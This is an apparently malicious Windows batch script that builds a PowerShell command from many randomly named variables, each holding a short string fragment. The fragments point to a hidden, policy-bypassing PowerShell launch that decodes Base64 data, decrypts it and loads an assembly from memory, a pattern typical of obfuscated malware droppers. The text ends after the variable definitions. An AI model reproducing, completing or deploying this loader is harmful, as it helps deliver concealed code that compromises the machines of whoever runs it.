@echo off
set "JZPtTtVZIN=rS"
set "vmNvYtyLlA=xe"
set "LMlFHRxyXU=rs"
set "SWMBbEwJRz= C"
set "fHJDOowssD=Po"
set "BErdBMLycI=st"
set "RODUagRqKv=\v"
set "pCgrHmqKyN=y "
set "VfTzhFnHFz=nd"
set "BZiHevyWcw=co"
set "btuLkmtEIc=he"
set "swKEVmjxDr=1."
set "PMsAprraif=em"
set "JOsTJOmXDA=:\"
set "rvMqEDVTLd=Sy"
set "BQbPDznbXA=Wi"
set "ZRPEVFlKrE=\W"
set "mUKGtkWmUX=do"
set "APNKWfgikK=we"
set "ZOfCNVKAIw=ow"
set "nPcKmxUxye=.e"
set "kDNSrcUWYB=s\"
set "WnHsJnFIaF= /"
set "ByhDEbCUsG=ll"
set "kgcfWTKLpa=po"
set "KqIeiDbOYj=32"
set "qwTqLFclan=in"
set "NDUrxVjPXC=ll"
set "VZrfXgeyVY=0\"
set "NTwwMqSpvl=we"
set "JdurkwAqsS=py"
set "HoGqhEkgRf=he"
set "KXATIYXOFK=ws"
set "FlIIRfYFvZ=cd"
set "iIQraRPgHx= %~dp0"
set "GqGfEtmFKl=)) {"
set "rEguabRlxS=();$"
set "SFEBTDynEg=ptog"
set "UlRDcgZEhL=uEHW"
set "fuyYOArEIZ=DNJS"
set "xBewySeUNg=]::("
set "cBcVTkLxAq=aYNE"
set "liPtcukMlA=:: '"
set "sNvUtatTtY=[Sys"
set "PZZoZEAeMm=eYoR"
set "cIPMGpjqXE=trea"
set "AELbAnnWpd=morF"
set "tVCrCZHxvh=7kGw"
set "tTKUMzYmsp=am;$"
set "llvLcZcDtV=ReYo"
set "vPSOVbFHdt=m.Re"
set "eXaCztmQqI=bypa"
set "PdRaDXUdGL=F'[-"
set "rZYRFXyBul=HO3I"
set "fxPdwIVWBa=aYNE"
set "jjAAizlEVA=iron"
set "NBrflofZcH=6esa"
set "IBAXGCCdiR=Obje"
set "soAMLBVMLV=[-1."
set "iPFQTLvQDZ=-1.."
set "gaawBVBdoi=ose("
set "YqOCJaExBE=shX "
set "AIwIhvCSoT=Mode"
set "qeugviRSxx=aYNE"
set "AaPclLGHkd=Secu"
set "tQXvfHManx=New-"
set "YhUtsVctdU=Disp"
set "ppVKpcbFnG=Obje"
set "vQWZmIvEel=.Len"
set "RjcmPGTOKs=eYoR"
set "lIUwaYpJRD=nirt"
set "SOHjCYxpLq=ROV."
set "rYgbzEWGAp=lBlo"
set "ckRqcOQAox=.Mod"
set "jzRMvmINcC= = ["
set "JhafvlWSTg=Syst"
set "rlEAjuTWOs=ROV "
set "rujNtLrrnB=ay()"
set "xVzCvBYesr=.-16"
set "hXdAFqwOCx=ing("
set "RSHesZmhUp=16] "
set "GDTTsuOziQ=);$F"
set "BvOnjPTyhU=nage"
set "ZdwZrKrCaS=oryS"
set "AoLNBuKgUs=[IO."
set "CUoYkpVkHn=-nop"
set "CllanZpvjW=ach "
set "UkiONgLtzz=O.Me"
set "oJqBVJEXoY=yste"
set "NjINrmdwEV=oR ="
set "JKCVQjweSj=y.Pa"
set "lMxcomigKA=ReYo"
set "orNYyzeDYZ=ypto"
set "KeUQekFcyc=pStr"
set "HnbqZdrnBi=, (,"
set "gqCScEabmA=[]] "
set "cTBsiWvtjL=.Ass"
set "xiovsRwRGB=::De"
set "EIFrPkIYJW=.Cre"
set "HkAIKVXZtU=]::N"
set "vJdSwAIKya=th('"
set "YxHzXcerta=tryP"
set "eRjILUTzKZ=[Sys"
set "oQgsVFZMmQ=urit"
set "KXHuZYcVHd=y.Cr"
set "JmzOhagYTa=bstr"
set "NcyxvjViJO=.IO."
set "AUEGwheCoh=$ReY"
set "evYRSwzSad=tem."
set "zUdGIuQvYh=m.IO"
set "vhRJYxvzva==');"
set "vDtvbCmTaC=-Obj"
set "tnYwAgoJTe= [Sy"
set "RxtclvMLTZ=ddin"
set "vwHsJvnLhJ=eam("
set "ZqyLOjOoZN=y]::"
set "VGHyTwZPUp=8kuY"
set "gFaSGagMRA=1] -"
set "smQbdHXrpb=rt]:"
set "EvzuFaMSsF=n ''"
set "ySiqijpmvA=Y.Su"
set "LTHGgWQZuf=-ep "
set "AKKQdIuNBx=saBm"
set "byxAkOEtOF=oL'["
set "JIJQEmKcKn=r) {"
set "aqmMDMagra=rity"
set "PYHJfMyRmT=ss -"
set "bvQxsHNwKm=ct S"
set "CUGHVvjGQW=:('g"
set "PLWOHdYDoP=ct S"
set "arWjpxygwO=ddin"
set "cCQltWKBry=lm.D"
set "DZOozKRUVG=tem."
set "nvfKgpNgAp=ptog"
set "pdEagvLaQS=gnir"
set "INcAygwLmR=.Cop"
set "yXvNNeoWzU=ptor"
set "CavwSqzqAH=onve"
set "ErMCjAhrZV=ress"
set "qaYTWZYogn=S46e"
set "xCbmKOtJve= '')"
set "NltXKYHKOh=New-"
set "DQivlVUZsn=ring"
set "LATcONprEG=oR);"
set "JfSLVjyHVi=yTo("
set "TyxcLWwMIE=)($l"
set "KLgnkAkpVR=m = "
set "dpSHrtoTwH=('ev"
set "qRWwyeDQGE=ert]"
set "lMAkisdWDl=ion."
set "bggHCupahY=($JO"
set "kFOymyxDBc=hy.A"
set "mflJHOfrCC=X.En"
set "NRjstFPQWt=ment"
set "uXgqtjaEPa=.Cry"
